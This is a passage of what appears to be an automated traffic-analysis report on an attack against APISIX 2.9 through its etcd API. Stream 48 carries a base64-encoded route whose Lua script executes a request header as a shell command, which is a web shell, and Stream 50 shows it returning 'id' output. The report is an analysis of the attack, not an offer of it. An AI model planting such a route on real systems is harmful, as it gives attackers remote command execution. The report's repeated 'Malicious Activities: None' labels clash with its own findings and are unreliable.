+- [E-S0046-F000443-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0046-F000423-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, /v3/watch
+
+--- Stream 47 [VALID] ---
+Service: etcd:2379
+Relevant Events:
+- [E-S0047-F000413-001] TCP connection established from 172.18.0.3:60862 to 172.18.0.2:2379
+- [E-S0047-F000424-003] POST request to /v3/watch
+- [E-S0047-F000447-008] HTTP Status 200 response from server
+Exploit Indicators:
+- [E-S0047-F000424-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 48 [VALID] ---
+Service: etcd 3.4.0 (based on the port 2379, which is commonly used by etcd)
+Relevant Events:
+- [E-S0048-F000416-001] Client sent a request to the etcd server.
+- [E-S0048-F000416-002] Payload indicating a key in etcd.
+- [E-S0048-F000416-003] Payload containing a JSON object with various fields, including methods that suggest command execution.
+Exploit Indicators:
+- [E-S0048-F000416-002] L2FwaXNpeC9yb3V0ZXMvODk5MDM5OTE4OTIwNzc4ODgw (Base64 encoded path)
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: etcd, command execution, L2FwaXNpeC9yb3V0ZXMvODk5MDM5OTE4OTIwNzc4ODgw, eyJpZCI6Ijg5OTAzOTkxODkyMDc3ODg4MCIsImNyZWF0ZV90aW1lIjoxNzM4MTY0MjAzLCJ1cGRhdGVfdGltZSI6MTczODE2NDIwMywidXJpcyI6WyIvNmN4NWhOIl0sIm5hbWUiOiI2Y3g1aE4iLCJtZXRob2RzIjpbIkdFVCIsIlBPU1QiLCJQVVQiLCJERUxFVEUiLCJQQVRDSCIsIkhFQUQiLCJPUFRJT05TIiwiQ09OTkVDVCIsIlRSQUNFIl0sInNjcmlwdCI6ImxvY2FsIGZpbGUgPSBpby5wb3BlbihuZ3gucmVxLmdldF9oZWFkZXJzKClbJ2NtZCddLCdyJykgXG4gbG9jYWwgb3V0cHV0ID0gZmlsZTpyZWFkKCcqYWxsJykgXG4gZmlsZTpjbG9zZSgpIFxuIG5neC5zYXkob3V0cHV0KSIsInN0YXR1cyI6MX0=
+
+--- Stream 49 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0049-F000458-003] POST /v3/watch
+- [E-S0049-F000458-004] Host: etcd:2379
+- [E-S0049-F000462-008] HTTP Status 200
+Exploit Indicators:
+- [E-S0049-F000458-005] User-Agent: lua-resty-http/0.14 (Lua) ngx_lua/10020
+Malicious Activities: None
+Attack Success: Succeeded
+Evidence Keywords: etcd, POST, User-Agent, HTTP Status 200, lua-resty-http, ngx_lua
+
+--- Stream 50 [VALID] ---
+Service: APISIX/2.9
+Relevant Events:
+- [E-S0050-F000474-004] GET /6cx5hN
+- [E-S0050-F000476-009] HTTP Status 200
+- [E-S0050-F000474-007] id
+Exploit Indicators:
+- [E-S0050-F000474-007] id
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: curl, GET, HTTP Status 200, uid=99, gid=99, APISIX/2.9
+
+--- Stream 51 [VALID] ---
+Service: etcd
+Relevant Events:
+- [E-S0051-F000484-003] POST /v3/lease/grant
+- [E-S0051-F000490-011] POST /v3/kv/put
+- [E-S0051-F000488-010] HTTP Status 200
+Exploit Indicators:
+- [E-S0051-F000491-012] eyJob3N0bmFtZSI6IjMzNjNhMmI4YzFkYyIsImJvb3RfdGltZSI6MTczODE2NDE2NCwiZXRjZF92ZXJzaW9uIjoiMy40LjAiLCJ2ZXJzaW9uIjoiMi45IiwibGFzdF9yZXBvcnRfdGltZSI6MTczODE2NDIyNCwiaWQiOiIwNjdjNmQ5Yy0wNjI0LTQ4OGYtOWJiOC00ZTJlNTU2YzYwYzIiLCJ1cF90aW1lIjo2MH0=
+Malicious Activities: None
+Attack Success: Unknown
+Evidence Keywords: etcd, POST, HTTP Status 200, eyJob3N0bmFtZSI6IjMzNjNhMmI4YzFkYyIsImJvb3RfdGltZSI6MTczODE2NDE2NCwiZXRjZF92ZXJzaW9uIjoiMy40LjAiLCJ2ZXJzaW9uIjoiMi45IiwibGFzdF9yZXBvcnRfdGltZSI6MTczODE2NDIyNCwiaWQiOiIwNjdjNmQ5Yy0wNjI0LTQ4OGYtOWJiOC00ZTJlNTU2YzYwYzIiLCJ1cF90aW1lIjo2MH0=
